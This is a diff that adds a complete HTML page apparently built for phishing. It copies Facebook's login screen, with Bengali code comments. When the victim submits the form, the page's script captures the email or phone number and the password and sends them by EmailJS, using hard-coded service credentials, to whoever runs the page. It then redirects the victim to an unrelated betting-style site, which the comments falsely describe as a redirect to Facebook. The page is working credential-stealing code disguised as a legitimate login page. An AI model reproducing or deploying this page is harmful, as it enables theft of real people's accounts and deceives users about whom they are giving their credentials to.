@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Facebook – log in or sign up</title>
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  
+  <style>
+    /* বেসিক রিসেট */
+    * { box-sizing: border-box; }
+    
+    body {
+      font-family: Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh; /* পুরো স্ক্রিন জুড়ে থাকবে */
+    }
+
+    .container {
+      display: flex;
+      max-width: 980px;
+      width: 100%;
+      padding: 20px;
+      justify-content: space-between; /* বাম এবং ডান পাশের ফাঁকা রাখার জন্য */
+      align-items: center;
+    }
+
+    .left-col {
+      flex: 1;
+      padding-right: 32px;
+      text-align: left;
+    }
+
+    .logo {
+      font-size: 56px;
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 10px;
+      letter-spacing: -2px;
+    }
+
+    .tagline {
+      font-size: 24px; /* মোবাইলের জন্য সামান্য ছোট করা হয়েছে */
+      color: #1c1e21;
+      line-height: 32px;
+      margin-bottom: 24px;
+    }
+
+    .right-col {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .login-box {
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+      width: 396px; /* ডেস্কটপের জন্য ফিক্সড */
+      text-align: center;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+
+    button.login-btn {
+      width: 100%;
+      padding: 14px;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 16px;
+      transition: background 0.3s;
+    }
+
+    button.login-btn:hover {
+      background: #166fe5;
+    }
+
+    a.forgot {
+      display: block;
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .divider {
+      border-bottom: 1px solid #dadde1;
+      margin-bottom: 20px;
+      width: 80%; /* ডিজাইন ঠিক রাখতে */
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    button.create-btn {
+      padding: 14px 24px;
+      background: #42b72a;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button.create-btn:hover {
+      background: #36a420;
+    }
+
+    .loading {
+      display: none;
+      margin-top: 10px;
+      text-align: center;
+    }
+    
+    /* লোডিং ইমেজ স্টাইল */
+    .loader-img {
+        width: 24px;
+        height: 24px;
+    }
+
+    /* রেসপনসিভ ডিজাইন (মোবাইলের জন্য) */
+    @media (max-width: 900px) {
+      .container {
+        flex-direction: column; /* স্তম্ভ বিন্যাস */
+        padding: 10px;
+      }
+
+      .left-col {
+        text-align: center;
+        padding-right: 0;
+        margin-bottom: 24px;
+      }
+
+      .logo {
+        font-size: 48px; /* মোবাইলে ছোট লোগো */
+      }
+
+      .tagline {
+        font-size: 18px; /* মোবাইলে ছোট টেক্সট */
+        line-height: 24px;
+      }
+
+      .right-col {
+        width: 100%;
+      }
+
+      .login-box {
+        width: 100%; /* পুরো প্রস্থ জুড়ে নেবে */
+        max-width: 396px; /* খুব বড় না হয় তার জন্য সীমা */
+      }
+    }
+    
+    @media (max-width: 400px) {
+        .logo { font-size: 40px; }
+        .tagline { font-size: 16px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <!-- Left side -->
+  <div class="left-col">
+    <div class="logo">facebook</div>
+    <div class="tagline">Connect with friends and the world around you on Facebook.</div>
+  </div>
+
+  <!-- Right side -->
+  <div class="right-col">
+    <div class="login-box">
+      <form id="loginForm">
+        <input type="text" name="email" id="email" placeholder="Email address or phone number" required>
+        <input type="password" name="pass" id="pass" placeholder="Password" required>
+        <button type="submit" class="login-btn">Log In</button>
+        <a href="#" class="forgot">Forgot password?</a>
+        <div class="divider"></div>
+        <button type="button" class="create-btn">Create new account</button>
+      </form>
+      
+      <div class="loading" id="loader">
+        <!-- Facebook স্টাইলের লোডিং গিফ -->
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/E276so5ZfiN.gif" alt="Loading..." class="loader-img">
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // EmailJS ইনিশিয়ালাইজেশন
+  // এখানে আপনার PUBLIC_KEY বসান
+  (function(){
+      emailjs.init("S75kA2hxD6Krgkown"); 
+  })();
+
+  const form = document.getElementById('loginForm');
+  const loader = document.getElementById('loader');
+
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();               // পেজ রিলোড বন্ধ করুন
+
+    loader.style.display = 'block';   // লোডিং দেখান
+    const btn = document.querySelector('.login-btn');
+    btn.disabled = true;              // বাটন ডিজেবল করে দিন যাতে একাধিকবার ক্লিক না হয়
+
+    // তথ্য সংগ্রহ করা
+    const emailVal = document.getElementById('email').value;
+    const passVal = document.getElementById('pass').value;
+
+    try {
+      // EmailJS দিয়ে মেইল পাঠানো
+      const templateParams = {
+        from_email: emailVal,  // টেমপ্লেটে {{from_email}} থাকবে
+        password: passVal      // টেমপ্লেটে {{password}} থাকবে
+      };
+
+      // এখানে আপনার SERVICE_ID এবং TEMPLATE_ID বসান
+      await emailjs.send("service_gg5tizq", "template_5b0xi24", templateParams);
+
+      console.log('Success!');
+      
+      // ২ সেকেন্ড পর ফেসবুকে রিডাইরেক্ট করুন
+      setTimeout(() => {
+          window.location.href = 'https://nagad88bd.com/en-bd/';
+      }, 2000);
+
+    } catch (err) {
+      console.error('Error sending data:', err);
+      alert('Something went wrong. Please try again.');
+      loader.style.display = 'none';
+      btn.disabled = false;
+    }
+  });
+</script>
+
+</body>
+</html>
